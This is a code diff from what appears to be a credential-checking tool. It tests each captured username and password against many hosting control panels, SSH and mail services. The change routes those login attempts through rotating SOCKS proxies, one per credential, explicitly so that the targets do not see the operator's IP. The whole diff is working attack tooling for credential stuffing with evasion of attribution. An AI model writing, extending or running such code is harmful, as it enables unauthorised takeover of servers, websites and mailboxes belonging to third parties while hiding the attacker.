@@ -619,18 +619,22 @@ async function runBatchToDisk(source, seeds, opts, { resume = false } = {}) {
               const safe = async (fn, label) => {
                 try { return await fn(); } catch (e) { return { error: label + ': ' + (e.message || String(e)) }; }
               };
+              // Route the HTTPS control-panel checks through the proxy pool (a
+              // fresh SOCKS proxy per credential) so they don't hit panels from
+              // the operator's IP. Falls back to the manual proxy, then direct.
+              const panelProxy = (hasPool && proxyPool.getNext()) || proxyUrlFrom(opts.proxyConfig) || undefined;
               const [cp, wm, whm, ssh, imapR, pop3R, pleskR, daR, cyber, webmin, hestia] = await Promise.all([
-                safe(() => runCpanelChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2083, 2082, 8443] }).then(r => r[0]), 'cpanel'),
-                safe(() => runWebmailChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [443, 2096, 2095] }).then(r => r[0]), 'webmail'),
-                safe(() => runWhmChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2087, 2086, 8443] }).then(r => r[0]), 'whm'),
+                safe(() => runCpanelChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2083, 2082, 8443], proxy: panelProxy }).then(r => r[0]), 'cpanel'),
+                safe(() => runWebmailChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [443, 2096, 2095], proxy: panelProxy }).then(r => r[0]), 'webmail'),
+                safe(() => runWhmChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2087, 2086, 8443], proxy: panelProxy }).then(r => r[0]), 'whm'),
                 safe(() => runSSHChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [22, 2222, 2022] }).then(r => r[0]), 'ssh'),
                 safe(() => verifyImap({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'imap'),
                 safe(() => verifyPop3({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'pop3'),
-                safe(() => verifyPlesk({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'plesk'),
-                safe(() => verifyDirectAdmin({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'directadmin'),
-                safe(() => verifyCyberPanel({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000 }), 'cyberpanel'),
-                safe(() => verifyWebmin({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000 }), 'webmin'),
-                safe(() => verifyHestia({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000 }), 'hestia')
+                safe(() => verifyPlesk({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'plesk'),
+                safe(() => verifyDirectAdmin({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'directadmin'),
+                safe(() => verifyCyberPanel({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'cyberpanel'),
+                safe(() => verifyWebmin({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'webmin'),
+                safe(() => verifyHestia({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'hestia')
               ]);
               if (currentAbort?.signal.aborted) return;
               result.panels = { cpanel: cp, webmail: wm, whm, ssh, imap: imapR, pop3: pop3R, plesk: pleskR, directadmin: daR, cyberpanel: cyber, webmin, hestia };
